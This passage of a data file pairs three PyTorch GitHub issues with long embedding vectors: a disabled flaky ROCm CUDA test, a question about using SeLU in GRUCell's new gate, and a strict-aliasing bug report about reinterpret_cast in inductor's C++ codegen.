 -4.54802096e-01  1.82404183e-02  2.93311894e-01 -3.25902671e-01
 -2.38716751e-01 -7.84728974e-02  1.65744364e-01  1.70221612e-01
  3.65206361e-01 -1.60461679e-01 -5.41796125e-02  3.21891047e-02
 -1.07909888e-01  3.21842670e-01  3.69838905e-03 -2.60469392e-02
  1.97894603e-01  1.50013447e-01  9.83208120e-02  2.04210505e-02
  6.16089925e-02 -2.79572606e-01 -3.48246038e-01  3.55593264e-02
 -4.97725345e-02  2.05716029e-01 -4.30719525e-01  1.06701098e-01
 -1.76918283e-02  2.07487464e-01  1.14484236e-01 -2.30971158e-01
 -1.61642805e-01  1.89910121e-02 -1.14054479e-01  1.66191384e-02
  6.24240935e-02  2.44222462e-01  3.02570403e-01 -4.73721087e-01
 -1.48855746e-01  3.38299535e-02 -5.76011762e-02 -3.33135068e-01
 -2.92650402e-01 -3.54872784e-03  3.31043601e-01  5.55789232e-01
  4.39611897e-02  3.19005579e-01  1.18941538e-01  3.42753194e-02
  4.12475578e-02 -8.21281672e-02  2.10294783e-01  4.13401246e-01
  4.00582194e-01 -1.07459292e-01  1.73618510e-01  1.51058733e-01
 -2.40752175e-02 -1.14230350e-01 -2.70954669e-01 -2.70307660e-01
  2.23108932e-01 -1.33585006e-01 -1.35686845e-02  1.62050389e-02
  4.39625323e-01  1.32789657e-01 -6.17217422e-01  1.47154361e-01
 -9.97333601e-03  4.41002361e-02  3.95590067e-01 -1.89482540e-01
  4.03631419e-01 -1.62496954e-01  1.99080765e-01  2.62660444e-01
  2.25630507e-01 -1.44884735e-01 -7.05125928e-02 -1.37213022e-02]"
DISABLED test_pinned_memory_with_cudaregister (__main__.TestCuda) module: cuda module: rocm triaged module: flaky-tests skipped,"Platforms: rocm

This test was disabled because it is failing in CI. See [recent examples](https://hud.pytorch.org/failure/test_pinned_memory_with_cudaregister) and the most recent trunk [workflow logs](https://github.com/pytorch/pytorch/runs/17480272434).

Over the past 72 hours, it has flakily failed in 6 workflow(s).

**Debugging instructions (after clicking on the recent samples link):**
To find relevant log snippets:
1. Click on the workflow logs linked above
2. Grep for `test_pinned_memory_with_cudaregister`


Test file path: `test_cuda_expandable_segments.py`

cc @ptrblck @jeffdaily @sunway513 @jithunnair-amd @pruthvistony @ROCmSupport @dllehr-amd @jataylo @hongxiayang",False,"[-3.10438126e-03 -1.72370046e-01 -3.76197100e-01 -6.92091137e-03
 -7.22462982e-02 -1.37123451e-01  1.86242208e-01  1.00393549e-01
 -3.56455803e-01 -1.37895823e-01  2.90414006e-01 -4.94171321e-01
  1.53553724e-01  4.47634608e-02 -4.91402239e-01 -2.39362214e-02
 -3.83409411e-02  1.21309012e-01  1.83119908e-01  1.09052569e-01
 -2.37267286e-01 -1.13585358e-02 -4.09883142e-01  1.80451721e-01
 -2.37850338e-01  2.32591420e-01 -3.15820396e-01 -3.15078080e-01
  5.65452874e-03 -6.14394248e-02  1.11493677e-01  1.55034140e-01
 -7.77039602e-02  1.95311934e-01  2.99428135e-01 -1.38799995e-01
 -4.72581685e-01 -1.94860816e-01 -7.96797723e-02 -2.28653729e-01
  1.14958361e-02 -8.24649036e-02  1.30162183e-02  2.32197363e-02
 -3.56099941e-02 -2.44661123e-02 -6.65541738e-03  1.60815895e-01
 -1.69737011e-01 -8.37861374e-02  2.42232203e-01  8.65610987e-02
  6.14229552e-02 -4.12465394e-01 -5.26809506e-02  4.39805910e-02
  1.15456879e-01  2.31520727e-01 -2.56717019e-02  4.38869298e-01
  2.81322509e-01  9.00397599e-02 -1.63704947e-01  4.81726304e-02
  4.26731296e-02  3.01966280e-01  1.62262693e-02 -5.75079694e-02
  4.51951087e-01  7.44911879e-02 -5.32975979e-02  6.87866732e-02
 -3.49887729e-01 -5.90234995e-02  1.99787155e-01  3.45573395e-01
  3.58902924e-02 -8.53858441e-02 -5.12500852e-02 -1.40322819e-01
  1.16020069e-03  3.65238219e-01  7.39524662e-02 -2.55677879e-01
  1.63599268e-01 -2.33312041e-01  1.98683947e-01 -6.22144081e-02
 -7.91640393e-03 -2.84377515e-01  2.76443481e-01  3.19829702e-01
  3.44665796e-02  1.91837445e-01 -1.45738602e-01 -1.87697530e-01
 -7.35405907e-02  5.92647865e-03 -5.50757587e-01  3.45132388e-02
  1.31377190e-01  5.03749847e-02 -1.72687262e-01  4.91201758e-01
 -4.61446464e-01 -2.12154970e-01  3.15132737e-01 -1.18593641e-01
 -1.08356029e-01  1.64612785e-01  1.62238196e-01 -4.04700730e-03
  8.49090666e-02  2.28690147e-01  2.05240324e-02  1.18727721e-01
 -2.61940658e-01 -2.75658816e-01 -9.47750434e-02  4.32766438e-01
 -3.31173271e-01 -2.88986355e-01  6.28868192e-02 -7.67481104e-02
  1.87719971e-01 -1.33564487e-01  8.38188455e-03  8.84898454e-02
 -2.37700883e-02 -9.55155790e-02 -3.31898406e-02  3.42091769e-02
  2.01226458e-01 -1.45557031e-01 -1.81848973e-01  2.06537202e-01
 -1.99508250e-01 -7.26133958e-02  2.44826838e-01 -7.06314296e-02
 -2.40900159e-01  3.23248148e-01 -1.27240241e-01 -3.22449170e-02
  2.56476671e-01  6.87665492e-02 -1.65476874e-01  4.56635691e-02
  9.43410024e-02  3.60343218e-01  1.37900844e-01 -1.69601873e-01
 -9.63613540e-02  6.81413889e-01 -8.68838429e-02 -1.61334444e-02
  5.15780687e-01  2.05719993e-01 -1.38423115e-01 -3.52527559e-01
  6.87367395e-02  3.14792812e-01  2.01212037e-02 -4.76202369e-03
  2.89566219e-01 -5.01408651e-02 -2.83421099e-01  7.00335652e-02
  5.84533624e-03  2.84483433e-01  2.06976220e-01  2.14928649e-02
  2.34485731e-01 -1.06517822e-01  1.36471152e-01 -3.25848490e-01
 -5.62184565e-02 -1.45711780e-01  1.00665331e-01  2.16817051e-01
 -2.21627325e-01  1.37841091e-01  2.62806803e-01 -2.17596024e-01
 -2.00349301e-01  2.02972859e-01  5.00529706e-02  6.19096905e-02
 -1.95329078e-04 -1.11841105e-01 -6.50545955e-01 -4.00227532e-02
 -1.82270914e-01 -3.54379155e-02 -1.87521696e-01 -1.11664787e-01
  1.31336957e-01 -2.28198618e-01 -1.25234306e-01 -2.66263224e-02
 -1.51153266e-01  2.04297364e-01 -1.40254140e-01 -1.43950447e-01
 -6.40131012e-02  5.04294001e-02 -2.21573919e-01 -3.53929162e-01
  9.02827084e-02  2.01007754e-01 -1.98182836e-01 -2.02510014e-01
 -2.62745470e-01 -2.21436188e-01  7.13630617e-02  2.46862710e-01
  1.14433303e-01  1.27295218e-02 -2.43910268e-01  2.26723537e-01
  4.32941675e-01 -2.12688789e-01  1.77685440e-01 -2.50297219e-01
 -3.46380845e-02 -2.53991038e-01 -5.62554523e-02  4.36787456e-02
 -4.88958657e-02 -4.29913625e-02 -5.37421256e-02 -7.27847368e-02
 -1.70203805e-01 -1.78268135e-01  6.48390874e-02 -8.38490874e-02
 -1.44735947e-02 -1.79076403e-01  7.07269832e-02  1.73522174e-01
 -4.00975674e-01 -2.88237810e-01 -3.13409805e-01  2.77188923e-02
  3.74860644e-01  4.13816571e-01 -2.81549394e-02  2.33701505e-02
 -3.30854177e-01  1.78160369e-02  7.01620057e-03 -2.63709903e-01
  2.69696951e-01  2.06068560e-01 -1.04102537e-01  2.83703148e-01
 -3.52428481e-02 -2.06832644e-02 -7.33645074e-03 -1.50774077e-01
  2.24109516e-01  4.20435816e-01 -2.98859477e-01  5.08149385e-01
  3.08937222e-01  3.05946708e-01 -3.54002893e-01  5.11762686e-02
 -2.11059272e-01 -3.19827422e-02 -3.22933532e-02 -4.08421427e-01
  3.68587941e-01  6.88450262e-02  1.53581440e-01 -3.21405739e-01
  5.39515376e-01 -1.78139806e-01  1.86396800e-02  5.76282032e-02
  3.11262012e-01 -1.33635029e-01  8.12824294e-02  1.79826438e-01
  2.74359465e-01 -1.40613005e-01 -2.32896641e-01 -3.73631537e-01
 -1.10341787e-01 -1.17017850e-01 -2.18036443e-01  3.85416448e-01
  6.20207638e-02 -4.44358997e-02 -1.84396401e-01  4.82753143e-02
  8.30151141e-02  2.60157049e-01  2.48161748e-01 -6.03134334e-02
 -4.54802096e-01  1.82404183e-02  2.93311894e-01 -3.25902671e-01
 -2.38716751e-01 -7.84728974e-02  1.65744364e-01  1.70221612e-01
  3.65206361e-01 -1.60461679e-01 -5.41796125e-02  3.21891047e-02
 -1.07909888e-01  3.21842670e-01  3.69838905e-03 -2.60469392e-02
  1.97894603e-01  1.50013447e-01  9.83208120e-02  2.04210505e-02
  6.16089925e-02 -2.79572606e-01 -3.48246038e-01  3.55593264e-02
 -4.97725345e-02  2.05716029e-01 -4.30719525e-01  1.06701098e-01
 -1.76918283e-02  2.07487464e-01  1.14484236e-01 -2.30971158e-01
 -1.61642805e-01  1.89910121e-02 -1.14054479e-01  1.66191384e-02
  6.24240935e-02  2.44222462e-01  3.02570403e-01 -4.73721087e-01
 -1.48855746e-01  3.38299535e-02 -5.76011762e-02 -3.33135068e-01
 -2.92650402e-01 -3.54872784e-03  3.31043601e-01  5.55789232e-01
  4.39611897e-02  3.19005579e-01  1.18941538e-01  3.42753194e-02
  4.12475578e-02 -8.21281672e-02  2.10294783e-01  4.13401246e-01
  4.00582194e-01 -1.07459292e-01  1.73618510e-01  1.51058733e-01
 -2.40752175e-02 -1.14230350e-01 -2.70954669e-01 -2.70307660e-01
  2.23108932e-01 -1.33585006e-01 -1.35686845e-02  1.62050389e-02
  4.39625323e-01  1.32789657e-01 -6.17217422e-01  1.47154361e-01
 -9.97333601e-03  4.41002361e-02  3.95590067e-01 -1.89482540e-01
  4.03631419e-01 -1.62496954e-01  1.99080765e-01  2.62660444e-01
  2.25630507e-01 -1.44884735e-01 -7.05125928e-02 -1.37213022e-02]"
SeLU Activation Function Implementation In GRUCell  ,"The actual task is to replace the tanh_() at line#799 in _RNN.cpp_ with SeLU activation function in new_gate of gru_cell. The following code block is written in _RNN.cpp_ file.


```
template <typename cell_params>
struct GRUCell : Cell<Tensor, cell_params> {
  using hidden_type = Tensor;

  hidden_type operator()(
      const Tensor& input,
      const hidden_type& hidden,
      const cell_params& params,
      bool pre_compute_input = false) const override {
    if (input.is_cuda() || input.is_xpu()) {
      TORCH_CHECK(!pre_compute_input);
      auto igates = params.matmul_ih(input);
      auto hgates = params.matmul_hh(hidden);
      auto result = at::_thnn_fused_gru_cell(
          igates, hgates, hidden, params.b_ih(), params.b_hh());
      // Slice off the workspace argument (it's needed only for AD).
      return std::move(std::get<0>(result));
    }
    const auto chunked_igates = pre_compute_input
        ? input.unsafe_chunk(3, 1)
        : params.linear_ih(input).unsafe_chunk(3, 1);
    auto chunked_hgates = params.linear_hh(hidden).unsafe_chunk(3, 1);
    const auto reset_gate =
        chunked_hgates[0].add_(chunked_igates[0]).sigmoid_();
    const auto input_gate =
        chunked_hgates[1].add_(chunked_igates[1]).sigmoid_();
    **const auto new_gate =
        chunked_igates[2].add(chunked_hgates[2].mul_(reset_gate)).tanh_();**
    return (hidden - new_gate).mul_(input_gate).add_(new_gate);
  }
};
```

**The new_gate is the Tensor. How we can implement a custom function to iterate over the Tensor and apply the Selu activation function on them ??**

- I replaced the tanh_() with selu_() that was present in the build/aten/src/ATen/ops/selu.h folder after building the PyTorch from source code In Develop Mode and Also included the related header files. But on Re-Building it generated an error ""Did you mean relu_()"".

- I also tried to implement my own function for selu() but the problem was regarding Tensor datatype.",False,"[-6.20026171e-01  2.34873183e-02  1.25337392e-03 -8.14607516e-02
 -1.59740150e-01  1.52949333e-01  4.24395591e-01  9.23054591e-02
 -5.30168712e-02  6.97717220e-02  1.99133307e-01 -6.16429597e-02
 -1.38619915e-01  1.65182240e-02 -3.08994859e-01 -8.98015425e-02
 -2.48657644e-01  3.74235451e-01  4.97173406e-02 -3.44670057e-01
  3.52577537e-01 -6.20382242e-02 -3.21177095e-01 -4.11104821e-02
 -1.16669893e-01  6.60547614e-02 -1.59976691e-01  9.37650353e-02
 -3.02069392e-02  1.79866403e-02  2.84399688e-01  2.21330851e-01
  6.77206814e-02  2.48920500e-01  1.11418292e-02  2.25772202e-01
 -1.08772449e-01 -2.42329925e-01  1.10174045e-01 -1.41607106e-01
  1.89431071e-01  9.03133955e-03 -2.80645311e-01 -1.77397907e-01
  4.08934236e-01  1.30027682e-01 -5.39471954e-02  5.28592840e-02
 -1.33329496e-01 -3.61185670e-02  1.93851173e-01  2.21061856e-01
 -3.72335941e-01 -3.52329731e-01  5.40848635e-02 -8.29946622e-02
  1.03360370e-01  2.12664485e-01  3.63962114e-01  1.77288475e-03
  7.28581548e-02 -5.48893437e-02 -9.73789245e-02  5.69873899e-02
 -1.83918417e-01 -3.24709952e-01 -9.99440923e-02  1.83557898e-01
  5.44032872e-01  2.08478719e-02 -1.27072046e-02  2.88651675e-01
 -1.46059468e-01 -1.78622589e-01 -8.30616876e-02  2.72338033e-01
 -3.71640861e-01  1.02888688e-01 -7.97971338e-02 -1.05094157e-01
  3.54676872e-01  1.82731211e-01  5.93017228e-02 -1.13373458e-01
  2.80564457e-01  3.33737135e-01  2.40431443e-01 -2.23046452e-01
  5.67756534e-01 -3.61763351e-02  2.58803606e-01 -1.62559643e-01
 -2.73444206e-01 -2.48908669e-01  2.97635198e-01 -1.78846829e-02
  2.80579001e-01 -6.93314075e-02 -3.20806563e-01 -2.81284362e-01
 -2.43311465e-01  6.75875396e-02  7.68194646e-02  5.56320325e-02
  1.81493610e-01 -1.87606066e-01  1.23712800e-01 -8.94563347e-02
  1.89319234e-02 -1.47115439e-01  1.06442429e-01 -1.07454136e-01
  1.07970655e-01 -4.72292900e-02 -3.62186916e-02  1.92818046e-01
  2.11110204e-01 -4.82620299e-02  3.46401483e-02  5.29417396e-01
 -1.60626411e-01 -3.09971094e-01 -1.16782196e-01  3.79342169e-01
 -1.22687206e-01  2.29642868e-01 -1.37809768e-01 -1.06770687e-01
  8.85317028e-02  1.07490048e-01  2.13175565e-01  1.56569690e-01
  2.83163842e-02  1.18185744e-01 -4.32820693e-02  1.28037691e-01
 -3.75724256e-01 -1.28382385e-01 -5.59093058e-01 -3.40099663e-01
  1.77244619e-02  1.24749988e-02 -1.09962203e-01 -3.53808738e-02
  6.11884259e-02 -2.45753080e-01 -5.91360070e-02 -2.49425903e-01
  1.34557933e-02 -7.08050579e-02 -2.29768425e-01 -6.85749799e-02
  5.78716397e-02  1.09294400e-01 -3.93697284e-02 -8.97266790e-02
  2.62743413e-01  9.78326946e-02  5.64374700e-02 -3.06487858e-01
  1.97290808e-01  3.06053042e-01 -3.73997018e-02  3.81650746e-01
  5.43538690e-01  6.94471672e-02  5.46379462e-02  8.84591788e-02
 -4.06053364e-02  1.61608040e-01 -7.96438605e-02 -7.82697946e-02
 -2.38073781e-01 -3.17000985e-01  1.52004451e-01 -8.25669467e-02
  3.02102447e-01 -4.65281665e-01 -1.86470032e-01  2.34797359e-01
 -3.54223102e-02 -2.43153796e-01  1.21180728e-01  8.35167244e-04
 -2.06912398e-01  1.88853145e-01  3.26664448e-01  7.89683163e-02
 -3.29387665e-01  1.97243154e-01 -3.95181894e-01  2.00022310e-01
  1.37893796e-01  2.69725658e-02 -2.93206304e-01 -1.89476699e-01
  1.32494479e-01  1.70425564e-01 -3.50120425e-01 -1.88899674e-02
 -4.89347041e-01 -3.56679112e-01  1.16055630e-01  1.92251980e-01
  2.31844768e-01 -9.57157165e-02 -3.04942816e-01  2.33549252e-02
  8.65195394e-02  1.60799220e-01  7.48420358e-02 -9.02423337e-02
 -1.47214070e-01 -2.93150812e-01 -7.99994767e-02 -8.74310136e-02
 -1.41157642e-01  4.25356701e-02  7.55667314e-02 -1.08485542e-01
  2.30672181e-01 -1.94534406e-01  6.70416728e-02 -3.62158939e-02
  7.53391609e-02  6.98180199e-02 -1.54525518e-01 -1.37469977e-01
 -6.59135953e-02  2.16240063e-01  4.56611328e-02 -1.62034988e-01
  3.57450657e-02  9.73017141e-02  3.40008378e-01 -1.24828398e-01
 -9.18911770e-02 -1.22565338e-02  1.52758777e-01  4.73970585e-02
 -6.66815877e-01  6.54573217e-02 -4.20342952e-01 -8.17412585e-02
 -1.99633278e-03  7.85401762e-02  1.80557862e-01  1.73795015e-01
  3.16120759e-02 -7.06774443e-02 -1.01690441e-01  1.75163910e-01
  3.49754870e-01 -1.44672513e-01  2.88483277e-02  2.66409904e-01
 -1.84780389e-01  4.34996367e-01  3.06637604e-02 -6.37650490e-03
  1.91197217e-01  4.02433902e-01  2.46338904e-01  2.77959734e-01
  2.64475882e-01  3.40307951e-01  1.06700838e-01  2.40480855e-01
  1.33567214e-01 -3.24467048e-02  6.54629841e-02 -7.15437382e-02
  2.00675011e-01 -3.27945173e-01  9.52164233e-02 -5.48572123e-01
 -6.83383122e-02 -1.28724650e-01  2.21842125e-01  1.43050905e-02
  7.88713843e-02 -8.98086093e-03 -5.53049207e-01 -2.59025618e-02
  2.51101911e-01 -3.24555516e-01  1.78430706e-01 -1.38301164e-01
 -1.62891179e-01 -1.07238442e-01 -1.10489756e-01  1.27803966e-01
  2.11185902e-01 -4.28347260e-01  4.61238325e-02  3.03160429e-01
  2.73821443e-01 -2.06956059e-01 -2.18587071e-01 -2.51290023e-01
  2.63195857e-02  1.03300586e-01 -9.45611596e-02 -1.55450776e-01
 -8.01266730e-02  2.64756996e-02  1.10805079e-01 -1.45896256e-01
  4.92955506e-01 -2.87632048e-01  2.72961527e-01  3.82440209e-01
 -4.43401337e-02  1.81086987e-01 -4.81963158e-01 -9.14641768e-02
 -2.72812903e-01  2.37585008e-01  1.71654522e-01  8.75337571e-02
 -1.98054373e-01 -3.40399206e-01 -1.27472997e-01  1.46524280e-01
  8.01437050e-02  7.27376901e-05 -4.26366180e-01 -3.40822577e-01
  9.81494877e-03 -5.31122461e-03 -1.14474021e-01  7.71013945e-02
 -1.23348832e-02 -4.43649627e-02 -5.81222028e-03  8.37122872e-02
 -1.93670854e-01  3.91256735e-02  9.97921079e-02 -1.58615917e-01
 -3.33425224e-01  1.21996067e-02 -2.49135733e-01  2.05039196e-02
  5.59578463e-02 -4.59472060e-01 -1.05668128e-01  4.37957913e-01
 -7.36773610e-02  6.46502003e-02  4.48473468e-02  7.02609271e-02
 -6.47027045e-03  4.25668836e-01  2.78049633e-02  4.18350965e-01
  3.51698510e-02  1.22827291e-03 -3.64368260e-01  2.53554165e-01
 -1.43324332e-02 -2.29218781e-01 -4.14548874e-01 -8.38478953e-02
 -1.81218013e-01 -1.83401421e-01  4.81298447e-01 -1.88657939e-01
 -8.48532692e-02  4.34260249e-01 -3.30790073e-01  3.72935772e-01
  1.50805013e-02  3.83043945e-01  1.08222768e-01 -1.97219476e-01
  7.43763894e-03 -2.01675922e-01  2.93064564e-02  1.84412777e-01
 -1.67051442e-02  1.33810744e-01  1.28121316e-01  1.45371035e-01]"
`reinterpret_cast<float&>` violates strict aliasing in inductor cpp codegen triaged module: cpu inductor,">`reinterpret_cast<float&>` on an int is UB because it violates strict aliasing. What is this trying to do exactly? How about adding a `c10::bit_cast` that uses `std::bit_cast` if c++20 is available and the suggested `std::memcpy` polyfill at https://en.cppreference.com/w/cpp/numeric/bit_cast otherwise?

_Originally posted by @swolchok in https://github.com/pytorch/pytorch/issues/102920#issuecomment-1747679443_
            

cc @voznesenskym @penguinwu @EikanWang @Guobing-Chen @XiaobingSuper @zhuhaozhe @blzheng @Xia-Weiwen @wenzhe-nrv @jiayisunx @peterbell10 @ipiszy @yf225 @chenyang78 @kadeng @muchulee8 @aakhundov @ColinPeppler",False,"[-2.82442361e-01 -3.65277529e-01 -4.58421558e-01 -1.56069145e-01
 -3.91171187e-01 -3.79353702e-01  1.04427636e-01  7.25198537e-02
 -1.31330758e-01 -1.32745504e-01  2.70807952e-01 -5.18004954e-01
 -2.59990990e-01 -1.72498971e-01 -1.93583546e-04 -2.09413692e-01
  1.97358102e-01 -2.07089745e-02  4.85881269e-01  8.42212290e-02
 -3.31061482e-02  3.27728957e-01 -5.62739596e-02  2.42168278e-01
 -7.91817382e-02 -1.43798247e-01  1.87820569e-01 -1.47420941e-02
  1.92061946e-01 -9.05612335e-02  4.61675555e-01 -4.29245941e-02
 -2.86888424e-02  3.67267206e-02  1.57949209e-01  1.70804188e-02
 -2.14957505e-01 -1.22390866e-01 -2.53366888e-01 -1.99831650e-01
  1.36268809e-01  2.38113016e-01  5.35193011e-02 -4.91738319e-02
  1.77004486e-01  4.86887991e-02 -3.80489647e-01  2.39842609e-01
 -2.68223286e-01 -3.64031792e-01  1.20444052e-01  1.96667522e-01
 -2.02558160e-01 -7.20958337e-02 -1.59680218e-01 -2.60395080e-01
 -2.05044243e-02  1.02999210e-01  1.86634317e-01  3.48440707e-02
  4.06908281e-02  3.04692909e-02  2.74655163e-01  5.82666472e-02
 -4.78275567e-02  2.37337977e-01  1.87056959e-01  1.92185283e-01
  1.54437870e-01 -2.10088640e-01  3.28697488e-02 -3.39991739e-03
 -3.64298135e-01  1.55824885e-01  2.00477347e-01  2.72891223e-02
 -2.78901637e-01  2.19375908e-01  8.03177506e-02 -4.95752871e-01
  2.25674082e-02 -9.89110619e-02  2.47109309e-03  1.31042153e-01
  5.29749170e-02 -1.91144422e-02  3.89526598e-02 -3.65302444e-01
  9.98733789e-02  1.30494341e-01  1.41842335e-01 -2.27855906e-01
 -1.04822874e-01  3.76338989e-01 -8.17488506e-02 -1.92709804e-01
  7.22660720e-02 -1.37516260e-02 -2.39684969e-01  2.31209248e-02
 -9.35995132e-02  4.53532189e-02 -3.18984538e-01  2.05001086e-01
 -8.76060426e-02 -2.78057963e-01  4.58485782e-01  8.38802233e-02
 -1.51611604e-02 -7.98102394e-02  1.05162710e-02 -2.83904932e-02
  5.98547794e-02 -2.67328382e-01  8.90217051e-02  2.05750018e-01
 -1.99386805e-01 -1.22316897e-01  3.45733799e-02 -2.58442909e-01
 -9.35309678e-02 -1.99678555e-01 -2.63416409e-01  2.02026203e-01
  9.21695679e-02  2.22829133e-02 -1.80444032e-01 -2.05033183e-01
 -3.20119560e-02 -2.62051702e-01  2.21571520e-01  5.76387346e-03
  2.62786627e-01 -1.09015286e-01  5.65212727e-01  2.52196044e-01
 -5.09442091e-01 -4.55997288e-01 -1.98777035e-01 -7.34601080e-01
  1.18877873e-01  2.15968341e-01 -2.33592719e-01 -1.66189626e-01
  1.90395802e-01  9.58800763e-02 -9.12576616e-02 -1.10756375e-01
 -1.80309564e-01  4.38565314e-01  4.42108959e-02 -6.80210218e-02
 -2.32166037e-01  1.30753070e-01 -2.83927470e-01 -8.42034817e-04
  6.50762498e-01 -5.75198978e-02 -1.98266357e-01 -5.95227256e-02
  4.80586365e-02  5.36177456e-01  5.90023756e-01  1.75133958e-01
  3.74276578e-01 -5.24173975e-02 -2.17754126e-01 -7.43970945e-02
 -2.36697555e-01  1.20612510e-01 -5.60575962e-01 -2.70719349e-01
  1.21010296e-01 -1.20480031e-01  3.58826876e-01  3.68782729e-02
 -1.96291581e-01  1.05523497e-01  2.87838668e-01  4.03062522e-01
  2.58011132e-01  2.23330557e-01  2.64249623e-01  1.50831982e-01
 -9.14020687e-02  1.61800265e-01  2.82607049e-01  1.46737307e-01
 -5.52335717e-02  6.05587602e-01 -2.63921082e-01  5.96151873e-02
 -5.27781129e-01 -9.02638212e-03 -4.59530056e-02 -1.46041308e-02
  3.92272145e-01  4.15361941e-01  9.61697251e-02  1.82546020e-01
 -1.46975994e-01  2.40757585e-01  1.30523637e-01  3.80694345e-02
 -7.41856694e-02 -2.10203171e-01 -3.26159410e-02 -1.01264566e-01
 -1.08720750e-01  4.71233308e-01 -3.31371725e-01 -9.29629207e-02
 -1.93921044e-01 -5.07859111e-01 -1.60439759e-01 -1.66740268e-01
  1.78864330e-01  9.14474949e-03  2.70866394e-01  2.94815935e-02
  5.36980256e-02 -8.60242322e-02  3.24805737e-01 -9.77716893e-02
  2.92434514e-01 -2.05979884e-01 -1.76591009e-01 -3.62268165e-02
 -4.15082574e-01 -2.51477122e-01  1.77073479e-01 -1.53086632e-01
  1.60344541e-01 -1.38557076e-01 -2.18564332e-01  1.77097395e-01
  3.81796136e-02 -2.67354518e-01  2.10969448e-01 -3.37920129e-01
 -3.87176454e-01 -2.68029451e-01  3.10411844e-02  6.23746365e-02
  2.02348739e-01 -9.69589204e-02  3.70508939e-01  2.86563039e-01
 -4.76416573e-02  1.62166670e-01 -3.24449033e-01  4.40987259e-01
  5.43223143e-01 -2.74286002e-01  1.95891649e-01  1.66939706e-01
 -8.24116915e-02 -3.11078250e-01 -4.66358304e-01 -1.64994001e-01
 -1.30380973e-01  6.22918487e-01  1.52117550e-01 -3.87226999e-01
 -1.22504033e-01 -5.32064736e-02 -3.75438690e-01  2.28393152e-01
  2.61243582e-01 -3.25716883e-02  5.36065817e-01  8.44269693e-02
  3.47269177e-01 -2.43830055e-01  1.69145644e-01 -2.92070329e-01
  4.83920515e-01 -1.05137482e-01 -1.26153439e-01 -2.10463107e-02
 -1.01776309e-02  3.46173227e-01  2.21677989e-01  4.01578903e-01
  5.46082318e-01 -2.90786326e-01  1.46593586e-01 -1.90859720e-01
 -3.41792822e-01 -4.39944118e-01  6.77601099e-02 -2.14043200e-01
  1.95201747e-02 -8.05397779e-02 -7.78981000e-02 -3.97601537e-02
 -1.29727542e-01 -2.75408536e-01 -4.20477614e-03  1.47522334e-02
 -2.73378909e-01 -2.77967393e-01 -3.97898555e-02  3.52946281e-01
 -1.93067372e-01 -1.13137335e-01 -4.64114547e-02  2.80173957e-01
  2.76689291e-01 -1.38223171e-01  1.03101641e-01  1.10853955e-01
 -3.90229821e-01  2.47155815e-01 -1.08923808e-01  2.39202127e-01
 -3.64315584e-02  3.46138775e-01 -2.60290742e-01  9.57360789e-02
 -5.97134829e-02 -3.61421198e-01 -1.69917554e-01 -4.07557227e-02
 -1.71843380e-01 -1.11011744e-01 -2.94135928e-01 -1.96050793e-01
 -4.57571633e-03 -2.84252875e-02  1.17084414e-01  2.61304341e-03
  8.98795128e-02 -1.18341856e-03 -1.18963212e-01 -6.20137975e-02
  1.28549397e-01  1.24972790e-01 -8.89306702e-03 -9.12859142e-02
 -6.87508434e-02 -1.30165264e-01 -6.95678517e-02 -2.91113853e-01
 -2.52417177e-01 -1.95385769e-01  3.22491944e-01  4.38351810e-01
 -1.79610625e-02  4.80557792e-02  1.61262140e-01  2.47587174e-01
 -5.23048341e-02  2.77257025e-01  9.89338756e-02  1.61121130e-01
 -3.63409147e-03  9.98252407e-02  3.36773723e-01  2.16567606e-01
 -2.20996976e-01  1.11206457e-01 -3.78288895e-01 -1.15127861e-01
  2.74893865e-02 -9.95904207e-03  2.04572290e-01  2.29555249e-01
  2.67213862e-02  1.10856248e-02 -1.32966936e-01  1.23503752e-01
 -1.99053317e-01  3.22979987e-01  4.52553689e-01 -8.43034536e-02
  5.18479533e-02 -7.20215216e-02  2.57964373e-01  3.99969161e-01
  4.65182289e-02 -2.15895519e-01  2.84283608e-01  7.97965825e-02]"
